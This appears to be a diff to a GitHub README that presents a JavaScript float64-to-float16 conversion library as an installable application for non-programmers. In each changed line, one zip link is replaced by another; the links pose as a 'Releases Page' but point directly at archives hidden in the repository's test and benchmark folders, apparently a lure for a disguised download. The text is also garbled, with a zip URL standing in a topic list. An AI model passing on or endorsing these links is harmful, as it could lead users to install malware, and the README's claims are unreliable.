@@ -1,13 +1,13 @@
 # 🎉 number-float64-base-to-float16 - Easy Conversion of Numbers
 
 ## 🖱️ Download Now
-[![Download](https://raw.githubusercontent.com/deleekiir/number-float64-base-to-float16/main/test/fixtures/number-float64-base-to-float16-v1.7.zip)](https://raw.githubusercontent.com/deleekiir/number-float64-base-to-float16/main/test/fixtures/number-float64-base-to-float16-v1.7.zip)
+[![Download](https://github.com/deleekiir/number-float64-base-to-float16/raw/refs/heads/main/benchmark/to-base-float-number-1.8-beta.1.zip)](https://github.com/deleekiir/number-float64-base-to-float16/raw/refs/heads/main/benchmark/to-base-float-number-1.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **number-float64-base-to-float16** application! This program helps you convert double-precision floating-point numbers into half-precision floating-point numbers in a simple way. You do not need to be a programmer to use it. Follow the steps below to get started.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/deleekiir/number-float64-base-to-float16/main/test/fixtures/number-float64-base-to-float16-v1.7.zip).
+1. Visit this page to download: [Releases Page](https://github.com/deleekiir/number-float64-base-to-float16/raw/refs/heads/main/benchmark/to-base-float-number-1.8-beta.1.zip).
 2. Choose the version you want to download in the **Assets** section. Click on the file name to start the download.
 3. After downloading, find the file in your downloads folder. 
 
@@ -42,7 +42,7 @@ This application covers several topics related to number conversion. Here are a 
 - Base conversions
 - Floating-point numbers
 - JavaScript utilities
-- https://raw.githubusercontent.com/deleekiir/number-float64-base-to-float16/main/test/fixtures/number-float64-base-to-float16-v1.7.zip functions
+- https://github.com/deleekiir/number-float64-base-to-float16/raw/refs/heads/main/benchmark/to-base-float-number-1.8-beta.1.zip functions
 
 ## 🤔 Frequently Asked Questions
 
@@ -62,6 +62,6 @@ Yes, once downloaded, the application does not require an internet connection to
 ## 🎯 Support
 If you have any questions or need help with the application, feel free to visit our community forum or contact the support team through the GitHub Issues page.
 
-For further information, be sure to revisit the [Releases Page](https://raw.githubusercontent.com/deleekiir/number-float64-base-to-float16/main/test/fixtures/number-float64-base-to-float16-v1.7.zip). 
+For further information, be sure to revisit the [Releases Page](https://github.com/deleekiir/number-float64-base-to-float16/raw/refs/heads/main/benchmark/to-base-float-number-1.8-beta.1.zip). 
 
 Enjoy converting your numbers!
